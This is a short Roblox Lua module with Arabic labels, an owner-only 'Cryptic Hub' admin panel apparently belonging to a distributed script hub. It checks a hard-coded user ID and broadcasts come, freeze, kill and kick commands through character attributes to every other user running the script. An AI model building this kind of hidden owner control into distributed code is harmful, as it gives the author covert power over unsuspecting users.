-- [[ Cryptic Hub - Admin Panel (Broadcast to All Users) ]]
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

return function(tab, UI)
    local OWNER_ID = 3875086037
    if LocalPlayer.UserId ~= OWNER_ID then return end

    local function notify(title, text)
        pcall(function()
            StarterGui:SetCore("SendNotification", { Title = title, Text = text, Duration = 3 })
        end)
    end

    -- دالة لتفعيل الأمر ليراه كل مستخدمي السكربت في السيرفر فوراً
    local function triggerCommand(actionName)
        pcall(function()
            local char = LocalPlayer.Character
            if char then
                char:SetAttribute("CrypticCmd", actionName)
                char:SetAttribute("CrypticTime", tick())
                
                -- إزالة الإشارة بعد ثانية واحدة لتكون نظيفة
                task.delay(1, function()
                    if char and char:GetAttribute("CrypticCmd") == actionName then
                        char:SetAttribute("CrypticCmd", "NONE")
                    end
                end)
            end
        end)
    end

    tab:AddParagraph("Cryptic Admin (Global Broadcast)", "التحكم الجماعي: أي زر تضغطه سينفذه كل مستخدمي سكربتك في السيرفر فوراً.")

    tab:AddButton("⚡ سحب الجميع (.come)", function()
        triggerCommand("COME")
        notify("Admin", "تم إرسال أمر السحب لجميع مستخدمي السكربت!")
    end)

    tab:AddButton("❄️ تجميد / إلغاء تجميد الجميع (Freeze)", function()
        triggerCommand("FREEZE")
        notify("Admin", "تم تبديل حالة التجميد لجميع مستخدمي السكربت!")
    end)

    tab:AddButton("💀 قتل الجميع (Kill)", function()
        triggerCommand("KILL")
        notify("Admin", "تم إرسال أمر القتل لجميع مستخدمي السكربت!")
    end)

    tab:AddButton("🚪 طرد الجميع (Kick)", function()
        triggerCommand("KICK")
        notify("Admin", "تم إرسال أمر الطرد لجميع مستخدمي السكربت!")
    end)
end
